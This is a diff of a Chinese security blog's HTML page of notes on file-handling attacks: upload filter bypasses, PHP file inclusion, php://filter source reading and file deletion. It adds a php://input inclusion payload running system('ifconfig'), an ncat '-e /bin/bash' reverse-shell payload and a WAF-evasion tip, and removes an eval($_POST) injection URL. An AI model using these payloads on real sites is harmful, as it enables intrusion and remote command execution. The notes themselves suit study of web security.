@@ -16,7 +16,7 @@
 <meta property="og:url" content="http://tranzimiss.com/2019/04/23/文件操作/index.html">
 <meta property="og:site_name" content="TransMiss">
 <meta property="og:description" content="文件上传 字典生成 %00截断 畸形文件名 windows shell.php(%80-99%) NTFS ADS特性 shell.php….. shell.php::$Data shell.php:a.jpg       目录穿越 文件头绕过 修改Content-Type 双文件上传 超长截断 长文件名 长Content-Disposition   特殊文件 上传html、htm可以xss sw">
-<meta property="og:updated_time" content="2019-05-12T12:57:57.216Z">
+<meta property="og:updated_time" content="2019-05-12T13:00:05.900Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件操作">
 <meta name="twitter:description" content="文件上传 字典生成 %00截断 畸形文件名 windows shell.php(%80-99%) NTFS ADS特性 shell.php….. shell.php::$Data shell.php:a.jpg       目录穿越 文件头绕过 修改Content-Type 双文件上传 超长截断 长文件名 长Content-Disposition   特殊文件 上传html、htm可以xss sw">
@@ -367,16 +367,14 @@
 <li>直接包含php文件时php代码会被解析，不能看到源码，因此可以使用封装协议读取: ?page=php://filter/read=convert.base64-encode/resource=config.php</li>
 </ol>
 <ul>
-<li><code>http://xxx.xxx.com/ekucms/index.php?s=my/show/id/{~eval($_POST[X])}</code></li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### 文件包含 #####</span><br><span class="line">1. 本地文件包含</span><br><span class="line">2. 远程文件包含</span><br><span class="line"></span><br><span class="line">##### 文件删除 #####</span><br><span class="line"></span><br><span class="line">1. 删除配置文件，破坏网站</span><br><span class="line">2. 删除安装锁，从新部署安装</span><br><span class="line"></span><br><span class="line">###### 文件包含转为代码执行  ######</span><br><span class="line"></span><br><span class="line">+ 文件存在包含漏洞的代码如``` &lt;?php @include($_GET[&quot;file&quot;])?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用php://input, 构造url为 <a href="http://xxxx.com/fileinclude.hp?file=php://input" target="_blank" rel="noopener">http://xxxx.com/fileinclude.hp?file=php://input</a></p>
+</li>
+<li>同时使用post提交&lt;?php system(‘ifconfig’);?&gt;</li>
+<li>或者使用post提交system(‘ncat -e /bin/bash localhost 1234’);</li>
+<li>为了过狗，可以使用data：url格式</li>
 </ul>
-<h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h5><ol>
-<li>本地文件包含</li>
-<li>远程文件包含</li>
-</ol>
-<h5 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h5><ol>
-<li>删除配置文件，破坏网站</li>
-<li>删除安装锁，从新部署安装</li>
-</ol>
 
       
     </div>
@@ -388,7 +386,7 @@
         <p><span>本文标题:</span><a  href="/2019/04/23/文件操作/">文件操作</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Trans 的个人博客">Trans</a></p>
         <p><span>发布时间:</span>2019年04月23日 - 09时28分</p>
-        <p><span>最后更新:</span>2019年05月12日 - 20时57分</p>
+        <p><span>最后更新:</span>2019年05月12日 - 21时00分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/04/23/文件操作/" title="文件操作">http://tranzimiss.com/2019/04/23/文件操作/</a>
             <span class="copy-path" data-clipboard-text="原文: http://tranzimiss.com/2019/04/23/文件操作/　　作者: Trans" title=""></span>
@@ -425,7 +423,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#文件上传"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#文件读取"><span class="toc-number">2.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#文件包含"><span class="toc-number">3.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#文件删除"><span class="toc-number">4.</span> <span class="toc-text">文件删除</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#文件上传"><span class="toc-number">1.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#文件读取"><span class="toc-number">2.</span> <span class="toc-text">文件读取</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
